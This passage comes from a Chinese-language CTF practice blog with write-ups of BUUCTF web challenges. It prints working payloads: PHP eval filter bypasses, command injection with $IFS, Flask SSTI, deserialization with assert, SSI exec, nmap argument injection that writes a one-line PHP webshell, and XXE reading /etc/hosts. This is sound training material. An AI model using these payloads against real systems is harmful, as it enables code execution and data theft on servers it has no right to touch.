if(not os.path.exists(self.sandbox)):            os.mkdir(self.sandbox)    def Exec(self):        result &#x3D; &#123;&#125;        result[&#39;code&#39;] &#x3D; 500        if (self.checkSign()):            if &quot;scan&quot; in self.action:                tmpfile &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;w&#39;)                resp &#x3D; scan(self.param)                if (resp &#x3D;&#x3D; &quot;Connection Timeout&quot;):                    result[&#39;data&#39;] &#x3D; resp                else:                    print resp                    tmpfile.write(resp)                    tmpfile.close()                result[&#39;code&#39;] &#x3D; 200            if &quot;read&quot; in self.action:                f &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;r&#39;)                result[&#39;code&#39;] &#x3D; 200                result[&#39;data&#39;] &#x3D; f.read()            if result[&#39;code&#39;] &#x3D;&#x3D; 500:                result[&#39;data&#39;] &#x3D; &quot;Action Error&quot;        else:            result[&#39;code&#39;] &#x3D; 500            result[&#39;msg&#39;] &#x3D; &quot;Sign Error&quot;        return result         def checkSign(self):        if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign):            return True        else:            return False@app.route(&quot;&#x2F;geneSign&quot;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])def geneSign():    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    action &#x3D; &quot;scan&quot;    return getSign(action, param)@app.route(&#39;&#x2F;De1ta&#39;,methods&#x3D;[&#39;GET&#39;,&#39;POST&#39;])def challenge():    action &#x3D; urllib.unquote(request.cookies.get(&quot;action&quot;))    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    sign &#x3D; urllib.unquote(request.cookies.get(&quot;sign&quot;))    ip &#x3D; request.remote_addr    if(waf(param)):        return &quot;No Hacker!!!!&quot;    task &#x3D; Task(action, param, sign, ip)    return json.dumps(task.Exec())@app.route(&#39;&#x2F;&#39;)def index():    return open(&quot;code.txt&quot;,&quot;r&quot;).read()def scan(param):    socket.setdefaulttimeout(1)    try:        return urllib.urlopen(param).read()[:50]    except:        return &quot;Connection Timeout&quot;def getSign(action, param):    return hashlib.md5(secert_key + param + action).hexdigest()def md5(content):    return hashlib.md5(content).hexdigest()def waf(param):    check&#x3D;param.strip().lower()    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):        return True    else:        return Falseif __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.debug &#x3D; False    app.run(host&#x3D;&#39;0.0.0.0&#39;,port&#x3D;9999)</code></pre><p>Flask框架，先看路由，geneSign是对传入的param与其他字符串拼接并返回其md5值，De1ta是主要，传入3个参数，以及ip，先判断param是否是gopher或者file开头的参数，不是则过到Task中，并且返回task的Exec()函数结果，另外hint给出提示在flag.txt中有flag</p><pre class="language-none"><code class="language-none">1：&#x2F;geneSign：获得url中parma参数，通过getSign(action, param)生成摘要2：&#x2F;De1ta：获得cookie中的action和sign，waf(param),创建task对象，调用exce()方法，json格式返回3：&#x2F;：返回源码</code></pre><p>三个函数</p><pre class="language-none"><code class="language-none">def getSign(action, param):    return hashlib.md5(secert_key + param + action).hexdigest()def md5(content):    return hashlib.md5(content).hexdigest()def waf(param):    check&#x3D;param.strip().lower()    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):        return True    else:        return False</code></pre><p>getSign：返回secert_key + param + action的哈希值<br>md5：返回content的哈希值<br>waf：禁止了flie和gopher协议</p><pre class="language-python" data-language="python"><code class="language-python">task类class Task:    def __init__(self, action, param, sign, ip):        self.action &#x3D; action        self.param &#x3D; param        self.sign &#x3D; sign        self.sandbox &#x3D; md5(ip)        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr            os.mkdir(self.sandbox)def Exec(self):    result &#x3D; &#123;&#125;    result[&#39;code&#39;] &#x3D; 500    if (self.checkSign()):        if &quot;scan&quot; in self.action:            tmpfile &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;w&#39;)            resp &#x3D; scan(self.param)            if (resp &#x3D;&#x3D; &quot;Connection Timeout&quot;):                result[&#39;data&#39;] &#x3D; resp            else:                print resp                tmpfile.write(resp)                tmpfile.close()            result[&#39;code&#39;] &#x3D; 200        if &quot;read&quot; in self.action:            f &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;r&#39;)            result[&#39;code&#39;] &#x3D; 200            result[&#39;data&#39;] &#x3D; f.read()        if result[&#39;code&#39;] &#x3D;&#x3D; 500:            result[&#39;data&#39;] &#x3D; &quot;Action Error&quot;    else:        result[&#39;code&#39;] &#x3D; 500        result[&#39;msg&#39;] &#x3D; &quot;Sign Error&quot;    return resultdef checkSign(self):    if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign):        return True    else:        return False</code></pre><p>checkSign：检查cookie中的sign<br>Exec：检查cookie中的action，如果scan在action中，将param的文件内容写入result.txt，如果read在action中，读出result.txt 的内容</p><p>hint提示flag在flag.txt 中，想要读到他<br>首先：action=scan，param=flag.txt ，将flag.txt的内容读到result.txt中<br>然后：action=read，将result.txt的内容读出</p><p>绕过点：sign<br>checkSign会检查cookie中的sign==getSign（param，action）<br>两个困难点：secert_key的值未知</p><p>思路：先进入/De1ta中的challenge函数，在Exec中的scan部分中将flag.txt的内容存入result.txt，然后从read部分中将其存到result字典中读出，再以json形式返回到客户端，我们就能得到flag。</p><p>写入与读出部分</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908232308596.png" alt="image-20210908232308596"></p><p>而如果action中既有scan,又有read,那么就会依次执行scan和read</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908233510363.png" alt="image-20210908233510363"></p><p>而为了绕过这个验证，就要利用</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908233542937.png" alt="image-20210908233542937"></p><p>让param = flag.txtread</p><p>因为action为scan</p><p>所以得到的md5值为keyflag.txtreadscan</p><p>满足action=readscan param=flag.txt时的值</p><p><strong>解题</strong></p><p>​    首先进入genesign页面得到md5(keyflag.txtreadscan)的值作为sign</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908234141816.png" alt="image-20210908234141816"></p><p>在到de1ta界面抓包get进param=flag.php，在cookie内加入sign和action</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908234443102.png" alt="image-20210908234443102"></p><h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><p>源码</p><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&#39;c&#39;]))&#123;    show_source(__FILE__);&#125;else&#123;    &#x2F;&#x2F;例子 c&#x3D;20-1    $content &#x3D; $_GET[&#39;c&#39;];    if (strlen($content) &gt;&#x3D; 80) &#123;        die(&quot;太长了不会算&quot;);    &#125;    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];    foreach ($blacklist as $blackitem) &#123;        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;            die(&quot;请不要输入奇奇怪怪的字符&quot;);        &#125;    &#125;    &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);      foreach ($used_funcs[0] as $func) &#123;        if (!in_array($func, $whitelist)) &#123;            die(&quot;请不要输入奇奇怪怪的函数&quot;);        &#125;    &#125;    &#x2F;&#x2F;帮你算出答案    eval(&#39;echo &#39;.$content.&#39;;&#39;);&#125;</code></pre><p>payload：</p><pre class="language-txt" data-language="txt"><code class="language-txt">$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;tac flag.php或$pi&#x3D;base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)($pi&#x3D;base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))或base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220723233130669.png" alt="image-20220723233130669"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220723233250167.png" alt="image-20220723233250167"></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11588219.html">CISCN 2019 初赛]Love Math - MustaphaMond - 博客园 (cnblogs.com)</a></p><p> <a href="https://blog.csdn.net/miuzzx/article/details/104817391">CISCN 2019 初赛]Love Math_羽的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_37589805/article/details/116205287?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.baidujsUnder6&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.baidujsUnder6">CISCN 2019 初赛]Love Math_分享简单的安全技术-CSDN博客</a></p><h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210828220705465.png" alt="image-20210828220705465"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210828220729509.png" alt="image-20210828220729509"></p><p>level1</p><blockquote><p><strong>intval()</strong> 函数用于获取变量的整数值。</p></blockquote><p>测试：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    $a &#x3D; &#39;2e4&#39;;    var_dump($a);    var_dump(intval($a));    $b &#x3D; $a + 1;    echo $b.&quot;\n&quot;;    var_dump($b);    var_dump(intval($b));</code></pre><p>输出</p><pre class="language-php" data-language="php"><code class="language-php">string(3) &quot;2e4&quot;int(2)20001float(20001)int(20001)</code></pre><p>level2</p><p><strong>php弱比较，php会将以0x开头的字符串，当进行==弱比较时，会认为是相同的。</strong></p><p>所以就变成了找到一个以0e开头的字符串s,并且smd5(s)也是以0e开头的字符串。</p><p><strong>0e215962017</strong></p><p>level3</p><p>**<code>$IFS$9</code>**替代空格，用其他的查看文件命令代替cat</p><p>payload：</p><pre class="language-txt" data-language="txt"><code class="language-txt">？num&#x3D;1e10&amp;md5&#x3D;0e215962017&amp;get_flag&#x3D;more$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210828221110477.png" alt="image-20210828221110477"></p><h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><pre class="language-none"><code class="language-none">import flaskimport osapp &#x3D; flask.Flask(__name__)app.config[&#39;FLAG&#39;] &#x3D; os.environ.pop(&#39;FLAG&#39;)&#x2F;&#x2F;注册了一个名为FLAG的config，这里基本可以确定是flag。@app.route(&#39;&#x2F;&#39;)def index():    return open(__file__).read()@app.route(&#39;&#x2F;shrine&#x2F;&lt;path:shrine&gt;&#39;)def shrine(shrine):    def safe_jinja(s):        s &#x3D; s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)        blacklist &#x3D; [&#39;config&#39;, &#39;self&#39;]&#x2F;&#x2F;设置黑名单        return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;&#x3D;None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s&#x2F;&#x2F;把黑名单内的内容置空    return flask.render_template_string(safe_jinja(shrine))if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(debug&#x3D;True)</code></pre><p>ssti注入，先试一个<code>&#123;&#123;7*7&#125;&#125;</code></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210829230144787.png" alt="image-20210829230144787"></p><p>接下来就可以考虑在shrine下直接<code>&#123;&#123;config&#125;&#125;</code>即可查看所有app.config内容，但是这题设了黑名单[&#39;config&#39;,&#39;self&#39;]并且过滤了括号，但是python还有一个函数叫做url_for，其作用是url是用于构建指定函数的URL，再配合globals，该函数会以字典类型返回当前位置的全部全局变量。这样也可以实现查看的效果</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210829230829515.png" alt="image-20210829230829515"></p><p>current_app意思应该是当前app，那我们就当前app下的config：</p><p>于是可以读到flag</p><pre class="language-none"><code class="language-none">&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210829230933251.png" alt="image-20210829230933251"></p><p>也可以用</p><pre class="language-none"><code class="language-none">get_flashed_messages</code></pre><p>返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。</p><pre class="language-none"><code class="language-none">get_flashed_messages.__globals__[&#39;current_app&#39;].config</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210829231104006.png" alt="image-20210829231104006"></p><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>进去后看源码，有一段js脚本</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210906112938529.png" alt="image-20210906112938529"></p><p>试了一下这个md5，能解出来但是是付费记录</p><p>所以直接看flag.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210906113351506.png" alt="image-20210906113351506"></p><p>“除了购买者和我自己”</p><p>那就试试127.0.0.1本地访问</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210906113445324.png" alt="image-20210906113445324"></p><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907150757059.png" alt="image-20210907150757059"></p><p>跳到time.php?source界面看看内容</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907150827681.png" alt="image-20210907150827681"></p><p>反序列化构造实现命令执行</p><p>eval这里应该是过滤了，可以用assert代替</p><pre class="language-none"><code class="language-none">assert()简介：判断一个表达式是否成立。返回true or false。当参数为字符串时，会被当作php代码执行。例如 assert(&quot;phpinfo()&quot;)  &lt;&#x3D;&#x3D;&gt;  &lt;?phpinfo()?&gt;assert与eval的区别assert把整个字符串参数当php代码执行，eval把合法的php代码执行。</code></pre><p>payload：?data=O:8:&quot;HelloPhp&quot;:2:{s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;}</p><p>或者?data=O:8:&quot;HelloPhp&quot;:2:{s:1:&quot;a&quot;;s:16:&quot;eval($_POST[a]);&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;}然后post：a=phpinfo</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907151408539.png" alt="image-20210907151408539"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907153837010.png" alt="image-20210907153837010"></p><p>搜索flag就能找到</p><h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p>xff头的ssti注入，我好像之前做过一个差不多的</p><p>界面右上角ip可随意改变，因此可以利用readfile函数读flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907155218173.png" alt="image-20210907155218173"></p><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>扫目录，发现index.php.swp界面</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907202133630.png" alt="image-20210907202133630"></p><p>要让password前六位md5值为6d0bc1</p><p>爆破一下</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907203923885.png" alt="image-20210907203923885"></p><p>登录后抓包</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907204116239.png" alt="image-20210907204116239"></p><p>这里可以看见一个shtml页面</p><p>进入后的页面</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907204437473.png" alt="image-20210907204437473"></p><p>这里admin的位置是我们的用户名，这里利用了ssl注入</p><p><a href="https://blog.csdn.net/qq_40657585/article/details/84260844"> SSI注入漏洞_Hydra的博客-CSDN博客_ssi注入</a></p><p>（shtml是一种基于SSI技术的文件。SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。IIS和Apache都可以开启SSI功能）</p><p>（SSI注入的条件：</p><p>1.Web 服务器已支持SSI（服务器端包含）</p><p>2.Web 应用程序未对对相关SSI关键字做过滤</p><p>3.Web 应用程序在返回响应的HTML页面时，嵌入用户输入）</p><p>模板就类似于</p><p><code>&lt;!--#exec cmd=&quot;文件名称&quot;--&gt;</code></p><p>可以先用ls查看目录找到flag文件，再利用cat查看</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907204923959.png" alt="image-20210907204923959"></p><p>访问页面找到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907204713176.png" alt="image-20210907204713176"></p><h2 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h2><p>f12源码里有flag</p><p>好久没做这么简单的了</p><h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p>常见的nmap命令</p><p><a href="http://linux.51yip.com/search/nmap">nmap linux 命令 在线中文手册 (51yip.com)</a></p><p>选项 解释<br>-oN 标准保存<br>-oX XML保存<br>-oG Grep保存<br>-oA 保存到所有格式<br>-append-output 补充保存文件<br>选项-oG<br>将结果Grep保存。</p><p>nmap -F -oG test.txt 192.168.23.1<br>1<br>选项-oA<br>该选项可将扫描结果以标准格式、XML格式和Grep格式一次性保存，分别放在.nmap，.xml和.gnmap文件中。</p><p>nmap -F -oA test 192.168.3.2</p><p>这里就是要用nmap的 -oN命令写shell</p><pre class="language-none"><code class="language-none">&#39; -oN w4ke.txt &#39;</code></pre><p>返回host maybe down之后访问w4ke.txt</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907215022693.png" alt="image-20210907215022693"></p><p>所以可以试试写个一句话木马上去</p><pre class="language-none"><code class="language-none">&#39; -oN b.phtml  &lt;?php eval($_POST[&#39;a&#39;]); ?&gt;&#39;</code></pre><p>返回了hacker，所以应该是有东西被过滤了</p><p>试了一下发现是php被过滤了</p><p>可以用其他的进行替代</p><pre class="language-none"><code class="language-none">&lt;?&#x3D;eval($_POST[a]);?&gt;</code></pre><p>利用post传参执行命令</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907221126211.png" alt="image-20210907221126211"></p><p>参考链接 </p><p> <a href="https://blog.csdn.net/qq_43801002/article/details/107746582">网鼎杯 2020 朱雀组]Nmap_浩歌已行的博客-CSDN博客</a></p><p><a href="https://www.icode9.com/content-4-756152.html">网鼎杯 2020 朱雀组]Nmap (icode9.com)</a></p><h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>根据题目提示下载压缩包文件，里面存在三千多个php文件</p><p>每一个文件里都有shell，我们要找到一个能用的</p><pre class="language-none"><code class="language-none">import requestsimport osimport reurl &#x3D; &#39;http:&#x2F;&#x2F;22ffcd5e-b2cc-48c3-b7b7-4ba7bcc7d244.node4.buuoj.cn:81&#x2F;&#39;path &#x3D; r&#39;C:\Users\ethe\Desktop\www\src&#39;ptn_get &#x3D; re.compile(br&quot;\$_GET\[&#39;(\w+)&#39;\]&quot;)ptn_res &#x3D; re.compile(br&#39;success_hack&#39;)count &#x3D; 0for f in list(os.scandir(path)):    print(str(f)[11:-2])    count +&#x3D; 1    with open(f.path, &#39;rb&#39;) as fp:        data &#x3D; fp.read()    for get in set(ptn_get.findall(data)):        get &#x3D; get.decode(&#39;utf-8&#39;)        cmd &#x3D; &#39;echo &quot;success_hack&quot;;&#39;        r &#x3D; requests.get(url + f.name, params&#x3D;&#123;get: cmd&#125;)        if ptn_res.search(r.content) is not None:            print(f.name, get)            exit()</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908221800930.png" alt="image-20210908221800930"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908221812146.png" alt="image-20210908221812146"></p><h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>题目提示xml，抓包后</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210909203429736.png" alt="image-20210909203429736"></p><p>猜应该是有xxe注入，直接上payload，发现没读取成功</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210909203626014.png" alt="image-20210909203626014"></p><p>看一看dologin.php的源码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210909204007128.png" alt="image-20210909204007128"></p><pre class="language-none"><code class="language-none">&lt;?php&#x2F;*** autor: c0ny1* date: 2018-2-7*&#x2F;$USERNAME &#x3D; &#39;admin&#39;; &#x2F;&#x2F;è´¦å·$PASSWORD &#x3D; &#39;024b87931a03f738fff6693ce0a78c88&#39;; &#x2F;&#x2F;å¯ç $result &#x3D; null;libxml_disable_entity_loader(false);$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);try&#123;$dom &#x3D; new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);$creds &#x3D; simplexml_import_dom($dom);$username &#x3D; $creds-&gt;username;$password &#x3D; $creds-&gt;password;if($username &#x3D;&#x3D; $USERNAME &amp;&amp; $password &#x3D;&#x3D; $PASSWORD)&#123;$result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,1,$username);&#125;else&#123;$result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,0,$username);&#125;&#125;catch(Exception $e)&#123;$result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,3,$e-&gt;getMessage());&#125;header(&#39;Content-Type: text&#x2F;html; charset&#x3D;utf-8&#39;);echo $result;?&gt;</code></pre><p>但是从这个源码里也找不到flag</p><p>还有一个知识xxe可以内网探测存活的主机，获取/etc/hosts文件，我们分别读取关键文件：**/etc/hosts 和 /proc/net/arp**</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210909210613519.png" alt="image-20210909210613519"></p><p>访问proc/net/arp文件查看有无可利用内网主机</p><p>尝试访问一下这个ip，报错</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210909211003923.png" alt="image-20210909211003923"></p><p>之后c段扫描，找到flag</p><p><strong>总的来说，主机上面没有flag，需要去看hosts文件看看内网的主机是否有flag</strong></p><h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>这题感觉有点问题</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153230545.png" alt="image-20210912153230545"></p><p>写脚本找lv6</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153247599.png" alt="image-20210912153247599"></p><p>找到后</p><p>很明显钱不够</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153310649.png" 